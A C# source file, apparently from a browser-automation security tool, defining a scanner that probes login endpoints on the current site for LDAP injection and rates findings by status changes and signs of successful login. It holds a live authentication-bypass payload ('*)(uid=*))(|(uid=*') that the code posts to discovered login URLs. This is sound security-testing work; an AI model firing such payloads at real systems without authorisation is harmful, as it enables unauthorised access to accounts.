using System.Diagnostics;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// LDAP injection on login-shaped endpoints — breakout payloads after a 401/403 baseline.
/// High/critical only with auth-success signal (cookie, token, redirect, or logged-in marker); bare status-flip is medium.
/// Inspired by OWASP WSTG-INPV-06; also influenced by pentest-ai <c>web.ldap_injection</c>.
/// </summary>
public sealed class LdapScanProbe
{
    private readonly AutomationContext _ctx;
    private readonly Action<string, string> _log;

    public LdapScanProbe(AutomationContext context, Action<string, string> log)
    {
        _ctx = context;
        _log = log;
    }

    public sealed class LdapScanOptions
    {
        public int MaxCandidates { get; set; } = 10;
        public int TimeoutMs { get; set; } = 15000;
        public bool IncludeScaffold { get; set; } = true;
        public bool IncludeBrowserCookies { get; set; } = true;
        public List<string>? LoginUrls { get; set; }
    }

    public sealed class LdapFinding
    {
        public string Category { get; init; } = "ldap-injection";
        public string Severity { get; init; } = "high";
        public string Url { get; init; } = "";
        public int BaselineStatus { get; init; }
        public int AttackStatus { get; init; }
        public string Detail { get; init; } = "";
        public string Source { get; init; } = "scaffold";
    }

    public sealed class LdapScanResult
    {
        public string Message { get; init; } = "";
        public int CandidatesProbed { get; init; }
        public int ElapsedMs { get; init; }
        public List<LdapFinding> Findings { get; init; } = [];
        public bool HasFindings => Findings.Count > 0;
    }

    private static readonly Dictionary<string, string> BaselinePayload = new(StringComparer.OrdinalIgnoreCase)
    {
        ["username"] = "clean_user",
        ["password"] = "clean_pass"
    };

    private static readonly Dictionary<string, string> AttackPayload = new(StringComparer.OrdinalIgnoreCase)
    {
        ["username"] = "*)(uid=*))(|(uid=*",
        ["password"] = "x"
    };

    public async Task<LdapScanResult> RunAsync(LdapScanOptions options, CancellationToken ct = default)
    {
        var sw = Stopwatch.StartNew();
        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running ldap-scan.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority);
        var urls = BuildLoginUrls(origin, options);
        var findings = new List<LdapFinding>();
        var probed = 0;

        foreach (var url in urls.Take(options.MaxCandidates))
        {
            ct.ThrowIfCancellationRequested();
            probed++;

            var baseline = await LoginInjectionHelpers.PostJsonAsync(
                _ctx, url, BaselinePayload, null, options.TimeoutMs,
                followRedirects: false, options.IncludeBrowserCookies, ct);

            if (baseline.Status is not (401 or 403))
                continue;

            var attack = await LoginInjectionHelpers.PostJsonAsync(
                _ctx, url, AttackPayload, null, options.TimeoutMs,
                followRedirects: false, options.IncludeBrowserCookies, ct);

            if (!LoginInjectionHelpers.LdapBypassSuspected(attack, baseline))
                continue;

            var (hasSignal, detail) = LoginInjectionHelpers.ClassifyLdapAuthSignal(attack);
            var severity = hasSignal
                ? (attack.Status == 200 ? "critical" : "high")
                : "medium";
            var description = hasSignal
                ? $"status flip 200 with auth signal ({detail})"
                : "status flip from reject to 200 without auth signal";

            findings.Add(new LdapFinding
            {
                Severity = severity,
                Url = url,
                BaselineStatus = baseline.Status,
                AttackStatus = attack.Status,
                Detail = description,
                Source = options.LoginUrls?.Contains(url) == true ? "explicit" : "scaffold"
            });
            _log($"  FLAG LDAP: {url} ({description})", "#F44747");
        }

        return new LdapScanResult
        {
            Message = findings.Count > 0
                ? $"{findings.Count} LDAP injection indicator(s) across {probed} login URL(s)."
                : $"No LDAP injection indicators across {probed} login URL(s).",
            CandidatesProbed = probed,
            Findings = findings,
            ElapsedMs = (int)sw.ElapsedMilliseconds
        };
    }

    private List<string> BuildLoginUrls(string origin, LdapScanOptions options)
    {
        var urls = new List<string>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        if (options.LoginUrls is { Count: > 0 })
        {
            foreach (var u in options.LoginUrls)
            {
                if (seen.Add(u)) urls.Add(u);
            }
        }

        foreach (var entry in _ctx.Network.Entries)
        {
            if (!entry.Method.Equals("POST", StringComparison.OrdinalIgnoreCase)) continue;
            if (!Uri.TryCreate(entry.Url, UriKind.Absolute, out var uri)) continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;
            var path = uri.AbsolutePath.ToLowerInvariant();
            if (!path.Contains("login", StringComparison.Ordinal) && !path.Contains("auth", StringComparison.Ordinal))
                continue;
            if (seen.Add(entry.Url))
                urls.Add(entry.Url);
        }

        if (options.IncludeScaffold)
        {
            foreach (var u in InjectionScaffold.EnumerateLoginUrls(origin))
            {
                if (seen.Add(u))
                    urls.Add(u);
            }
        }

        return urls;
    }
}
